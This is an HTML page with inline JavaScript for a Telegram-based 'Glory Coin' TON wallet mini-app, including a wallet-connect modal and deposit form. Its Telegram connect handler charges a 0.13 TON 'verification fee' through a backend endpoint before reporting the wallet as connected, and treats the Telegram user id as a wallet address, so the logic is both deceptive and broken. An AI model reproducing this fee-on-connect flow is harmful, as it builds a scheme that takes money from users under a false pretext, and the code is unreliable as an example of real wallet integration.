<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallet - Glory Coin</title>
    <link rel="stylesheet" href="assets/css/wallet.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/fontawesome.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <link href="https://fonts.cdnfonts.com/css/i-icefrost" rel="stylesheet">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        /* Modal styling */
        .web3-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        .modal-content {
            background: #ffffff;
            padding: 20px;
            border-radius: 15px;
            width: 350px;
            text-align: center;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
            position: relative;
        }
        .modal-content h2 {
            margin-top: 10px;
            font-size: 20px;
            color: #333;
        }
        .modal-content p {
            color: #666;
            font-size: 14px;
            margin-bottom: 20px;
        }
        .wallet-option {
            width: 100%;
            padding: 10px;
            background-color: #0088cc;
            color: #ffffff;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            cursor: pointer;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .wallet-option img {
            height: 24px;
            margin-right: 8px;
        }
        .other-wallets {
            display: flex;
            justify-content: space-around;
            margin-top: 10px;
        }
        .other-wallets button {
            background: none;
            border: none;
            cursor: pointer;
        }
        .other-wallets img {
            height: 40px;
            width: 40px;
        }
        .close-modal {
            position: absolute;
            top: 10px;
            right: 10px;
            background: transparent;
            border: none;
            font-size: 18px;
            cursor: pointer;
            color: #888;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="assets/images/logo.png" alt="Logo" class="logo">
            
                <div class="token-count">
                    G:<span class="points-display" id="balance">:0</span>
                </div>
            
        </div>
        <div class="wallet-section">
            <div class="wallet-info"></div>
            <div class="wallet-box">
                <button class="ton-wallet-btn" id="wallet-connect-btn">Connect Wallet</button>
            </div>
        </div>

        <!-- Web3 Wallet Connection Modal -->
        <div class="web3-modal" id="web3Modal">
            <div class="modal-content">
                <button class="close-modal" onclick="closeModal()">✖</button>
                <h2>Connect your wallet</h2>
                <p>Select your wallet provider to connect</p>
                
                <!-- Main connect button for Telegram -->
                <button id="openTelegramWallet" class="wallet-option">
                    <img src="assets/images/telegram.png" alt="Telegram Icon">
                    Open Wallet in Telegram
                </button>
                
                <!-- Other wallet options -->
                <div class="other-wallets">
                    <button onclick="redirectToWallet('Tonkeeper')"><img src="assets/images/Tonkeeper.png" alt="Tonkeeper Icon"></button>
                    <button onclick="redirectToWallet('MyTonWallet')"><img src="assets/images/myton.png" alt="MyTonWallet Icon"></button>
                    <button onclick="redirectToWallet('Tonhub')"><img src="assets/images/toton.png" alt="Tonhub Icon"></button>
                    <button onclick="redirectToWallet('DeWallet')"><img src="assets/images/ton.png" alt="DeWallet Icon"></button>
                </div>
            </div>
        </div>

        <div class="tabs-section">
            <button class="tab active" data-tab="withdraw">Deposit</button>
            <button class="tab" data-tab="swap">Swap</button>
            <button class="tab" data-tab="transaction">Transaction</button>
        </div>

        <div class="withdraw-section">
    
            <div class="withdraw-box">
                <label for="withdraw-amount">Enter amount</label>
                <input type="text" id="withdraw-amount" placeholder="0">
                <p class="available-amount" id="available-ton">Available: 0 TON</p>
            </div>
            <button class="withdraw-btn" id="withdraw-btn">Deposit TON</button>
            <p class="withdraw-note">Note: Deposit  status will be marked as "Pending" until processed.</p>
        </div>

        <div class="nav">
            <div class="navbar">
                <ul class="menu">
                    <li><a href="index.html"><i class="fas fa-coins"></i> Earn</a></li>
                    <li><a href="task.html"><i class="fas fa-tasks"></i> Task</a></li>
                    <li><a href="frens.html"><i class="fas fa-user-friends"></i> Friend</a></li>
                    <li><a href="wallet.html"><i class="fas fa-wallet"></i> Wallet</a></li>
                </ul>
            </div>
        </div>

    </div>

    <!-- Add Telegram SDK for WebApp integration -->
    

    <script>
       // Initialize Telegram WebApp when the page loads
window.addEventListener("load", function () {
    if (typeof Telegram !== 'undefined' && Telegram.WebApp) {
        Telegram.WebApp.init();
    }
});

// Open the wallet modal on "Connect Wallet" button click
document.getElementById("wallet-connect-btn").addEventListener("click", function () {
    document.getElementById("web3Modal").style.display = "flex";
});

// Close the modal
function closeModal() {
    document.getElementById("web3Modal").style.display = "none";
}

// Redirect to chosen wallet provider
function redirectToWallet(walletName) {
    const walletURLs = {
        Tonkeeper: 'https://app.tonkeeper.com/',
        MyTonWallet: 'https://wallet.ton.org/',
        Tonhub: 'https://tonhub.com/',
        DeWallet: 'https://dewallet.app/'
    };
    const walletURL = walletURLs[walletName];

    if (walletURL) {
        window.open(walletURL, '_blank');
        closeModal();
    } else {
        console.error("Unknown wallet provider");
    }
}

// Handle Telegram Wallet connection
document.getElementById("openTelegramWallet").addEventListener("click", async function () {
    try {
        const walletAddress = await connectToTelegramWallet();
        const balance = await fetchTONBalance(walletAddress);

        if (balance >= 0.13) {
            const deductionSuccess = await deductVerificationFee(walletAddress, 0.13);
            if (deductionSuccess) {
                updateWalletUI(walletAddress, balance);
                alert("Wallet connected successfully!");
            } else {
                alert("Verification fee deduction failed. Please try again.");
            }
        } else {
            alert("Insufficient balance for verification. You need at least 0.13 TON.");
        }
    } catch (error) {
        console.error("Failed to connect to wallet:", error);
        alert("Wallet connection failed. Please try again.");
    } finally {
        closeModal();
    }
});

// Connect to Telegram Wallet in real-time (dummy function for testing)
async function connectToTelegramWallet() {
    try {
        const walletAddress = Telegram.WebApp.initDataUnsafe?.user?.id;
        if (!walletAddress) throw new Error("No wallet address found.");
        return walletAddress;
    } catch (error) {
        console.error("Telegram Wallet connection error:", error);
        throw error;
    }
}

// Fetch TON balance from backend
async function fetchTONBalance(walletAddress) {
    try {
        const response = await fetch(`/api/ton/getBalance/${walletAddress}`);
        if (!response.ok) throw new Error("Error fetching balance from server.");
        
        const { balance } = await response.json();
        return balance / 1e9; // Convert nanoton to TON
    } catch (error) {
        console.error("Error fetching balance:", error);
        throw error;
    }
}

// Deduct verification fee through the backend
async function deductVerificationFee(walletAddress, feeAmount) {
    try {
        const response = await fetch(`/api/ton/deductFee`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ walletAddress, feeAmount: feeAmount * 1e9 }) // Convert TON to nanoton
        });
        
        if (!response.ok) throw new Error("Fee deduction failed on server.");
        
        const { success } = await response.json();
        return success;
    } catch (error) {
        console.error("Error deducting fee:", error);
        return false;
    }
}

// Update wallet UI with balance and address
function updateWalletUI(walletAddress, balance) {
    const walletButton = document.getElementById("wallet-connect-btn");
    walletButton.textContent = `Wallet: ${walletAddress}`;
    walletButton.disabled = true;
    document.getElementById("balance").textContent = `TON: ${balance}`;
}


    </script>
    

   
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="assets/js/balance.js"></script>


</body>
</html>
